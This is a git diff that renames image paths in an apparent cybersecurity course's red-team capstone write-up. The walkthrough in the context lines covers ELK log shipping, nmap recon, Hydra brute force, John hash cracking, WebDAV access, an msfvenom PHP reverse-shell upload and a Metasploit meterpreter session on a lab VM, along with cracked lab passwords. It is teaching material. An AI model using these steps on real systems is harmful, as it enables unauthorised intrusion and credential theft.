@@ -11,7 +11,7 @@ There are three principal  Machines in the network
 
 3) ELK VM - For monitoring and generating logs
 
-![](images-red/network-diagram.png)
+![](Red-Team-images/network-diagram.png)
 
 
 ## Stage 1: Configuring the Capston VM so it can send the attack logs to ELK stack
@@ -23,20 +23,20 @@ There are three principal  Machines in the network
 - `filebeat setup`
 
 
-![](images-red/filebeat.png)
+![](Red-Team-images/filebeat.png)
 
 - Setting up **metricbeat** ships metrics data from server (e-g MongoDB, MYSQL, Apache) to ELK Stack or monitoring VM
 
 - `metricbeat modules enable apache`
 - `metricbeat setup`
 
-![](images-red/metricbeat.png)
+![](Red-Team-images/metricbeat.png)
 
 - Setting up **packetbeat** integrates Elasticsearch and Kibana to provide realtime analysis 
 
 - `packetbeat setup`
 
-![](images-red/packetbeat.png)
+![](Red-Team-images/packetbeat.png)
 
 - Restarting services after initial installation
 
@@ -44,7 +44,7 @@ There are three principal  Machines in the network
 - `systemctl restart metricbeat`
 - `systemctl restart packetbeat`
 
-![](images-red/restarting.png)
+![](Red-Team-images/images-red/restarting.png)
 
 
 
@@ -58,13 +58,13 @@ a) **Information Gathering**: Obtaining info regarding the network, e-g ip addre
 
 - `ifconfig` to discover the network ip address and range
 
-![](images-red/ifconfig.png)
+![](Red-Team-images/ifconfig.png)
 
 - `netdiscover` to determine the active hosts on the network- The actual command is below
 
 - `netdiscover -r 192.168.1.255/16`
 
-![](images-red/netdiscover.png)
+![](Red-Team-images/netdiscover.png)
 
 
 - Now this information is very revealing. Based on the infomration so far we can deduce:
@@ -77,17 +77,17 @@ a) **Information Gathering**: Obtaining info regarding the network, e-g ip addre
 
 - If I type the ip address `192.168.1.105`, it reveals a webpage to the company's server, so this IP is the Capstone VM. See below
 
-![](images-red/index-page.png)
+![](Red-Team-images/index-page.png)
 
 - There is no formal index.html page, and the company's directories are open -this is a significant vulnerability
 
 - Navigating to the folder directories makes it even worse and keeps pointing at some secret_folder
 
-![](images-red/secret_folder.png)
+![](Red-Team-images/secret_folder.png)
 
 - Typing `192.168.1.105/company_folders/secret_folder` as suggested, exposes further infomration about a potential person who maybe one of the admins. 
 
-![](images-red/ashtons-eyes.png)
+![](Red-Team-images/ashtons-eyes.png)
 
 - We now have a potential username `ashton` who's password we can attempt to later crack by a brute force attack 
 
@@ -95,7 +95,7 @@ a) **Information Gathering**: Obtaining info regarding the network, e-g ip addre
 
 - Clicking these directory links further reveals that the CEO of the company is Ryan, Hannah is the VP and Ashton is the manager
 
-![](images-red/blog.txt.png)
+![](Red-Team-images/blog.txt.png)
 
 
 b) **Scanning and Enumeration**
@@ -104,23 +104,23 @@ b) **Scanning and Enumeration**
 
 - Scanning for open ports and Version: `nmap -sV 192.168.1.1-105`
 
-![](images-red/nmap-scan1.png)
-![](images-red/nmap-scan2.png)
+![](Red-Team-images/nmap-scan1.png)
+![](Red-Team-images/nmap-scan2.png)
 
 - You can note that on the Capstone VM (ip:`192.168.1.105`) there is one open `port:80` which is a significant vulnerability I can exploit. We also learn about the `Apache server version 2.4.29` and the `OS of Linux` 
 
 - Checking for OS: `nmap -sS -A 192.168.1.105`
 
-![](images-red/complete-scan.png)
+![](Red-Team-images/complete-scan.png)
 
 - Notice the important information about directories and some insights regarding the text files that can provide further information
 
 - We can download these files directly 
 - `wget 192.168.1.105/meet_our_team/ashton.txt | cat ashton.txt`
 
-![](images-red/ashton.txt.png)
+![](Red-Team-images/ashton.txt.png)
 
-![](images-red/hannah.txt.png)
+![](Red-Team-images/hannah.txt.png)
 
 
 - Another option is also to run an nmap script that can reveal hidden files and directories : `nmap --script http-enum -p80 192.168.1.105`. Here `http-enum` is an NSE (Nmap scripting engine) script provides insights regarding the types of servers and applications in use within the subnet. 
@@ -135,36 +135,36 @@ c) **Exploitation**
 
 - Unziping the worlist to try to bruteforce attack. Note that in kali linux there is a pre-stored wordlist **rockyou.txt** in  `/usr/share/wordlists` if it is zipped then it must be unzipped before it can be used after unzipping `gunzip /usr/share/wordlists/rockyou.txt.gz`. In this case it does not appear that the file is zipped. 
 
-![](images-red/rockyou.txt.png)
+![](Red-Team-images/rockyou.txt.png)
 
 - Hydra brute force action: `hydra -l ashton -p /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder/` Here http-get will go to the website which is the ip address that we have already provided and will navigate to the path like: `http-get 192.168.1.105/company_folders/secret_folder/`
 
-![](images-red/hydra.png)
+![](Red-Team-images/hydra.png)
 
 - On accessing the secret folder, a new username noted: ryan, need to crack its hash that is also provided in the secret folder
 
-![](images-red/ashton-pw-cracked.png)
+![](Red-Team-images/ashton-pw-cracked.png)
 
 - Now that Ashton's password is cracked; `username`:**ashton** and  `password`:**leopoldo**, I should now be able to navigate to the secret folder: `
 
-![](images-red/login-ashton.png)
-![](images-red/secret_folder-accessed.png)
+![](Red-Team-images/login-ashton.png)
+![](Red-Team-images/secret_folder-accessed.png)
 
 - Reviewing the text file titled "connect_to_corp" reveals the instructions to connect and provided the CEO Ryan's hashed password
 
-![](images-red/ryans-hash.png)
+![](Red-Team-images/ryans-hash.png)
 
 - Crack Ryan's password hash with john the ripper: `john --format=raw-md5 ryans_hash`
 
-![](images-red/john-ryans-hash.png)
+![](Red-Team-images/john-ryans-hash.png)
 
 - With this new information, now I have a `username`: **ryan** and a `password`: **linux4u** to access company's file sharing whose path was also revealed in the instructions: `dav://172.16.84.205/webdav`. I initially tried connecting to it multiple times, but failed. Then I noticed that there is a mistake in the "connect_to_corp" instructions file. Seems that AZURE has not updated. I guessed the correct path to be `dav://192.168.1.105/webdav`. Because from the scanning and enumeration stage I know that the IP address of the capstone webserver is `192.168.1.105` and not 172.16.84.205
 
 - You can connect file sharing on a remote server by clicking on the folder icon from the apps panel in linux, selecting **`Other Locations`** and then typing in the address **`dav://192.168.1.105/webdav`** where it says "Connect to Server"
 
-![](images-red/webdav-connect.png)
+![](Red-Team-images/webdav-connect.png)
 
-![](images-red/webdav-opened.png)
+![](Red-Team-images/webdav-opened.png)
 
 
 - Now that I have acess to file sharing at Capsone VM through my Kali VM, you can hack Capstone by running a malacious script (if you may).  
@@ -177,13 +177,13 @@ c) **Exploitation**
 - `lhost` and `lport` specify the hacker's ip address and port which this payload will instruct the victim's mchine to connect to
 - `open-shell.php` is the file name. 
 
-![](images-red/msfvenom.png)
+![](Red-Team-images/msfvenom.png)
 
 - Pasting the `open-shell.php` script file inside the Capsone VM file sharing and running it
 
 - Once `open-shell.php` is generated then you can copy it into `dav://192.168.1.105/webdav/` from the browser - this can be done from Kali Linux as you are now already connected to the victim's machine 
 
-![](images-red/payload-pasted.png)
+![](Red-Team-images/payload-pasted.png)
 
 
 - Now in Kali VM run **Metasploit** and run the following commands to prepare for listening and being ready to accept any retrograde connection coming from Capstone VM(victim). 
@@ -195,7 +195,7 @@ c) **Exploitation**
 - `show options`
 - `run`
 
-![](images-red/setting-up-meterpreter.png)
+![](Red-Team-images/setting-up-meterpreter.png)
 
 
 
@@ -203,7 +203,7 @@ c) **Exploitation**
 
 - This will open up a meterpreter shell
 
-![](images-red/opened-meterpreter.png)
+![](Red-Team-images/opened-meterpreter.png)
 
 
 
@@ -216,7 +216,7 @@ d) **Post-exploitation**
 
 - `find -name flag.txt 2>/dev/null` Here `2>dev/null` is instructing to ignore any error messages while searching
 
-![](images-red/flag.png)
+![](Red-Team-images/flag.png)
 
 
 e) **Reporting Vulnerabilities**
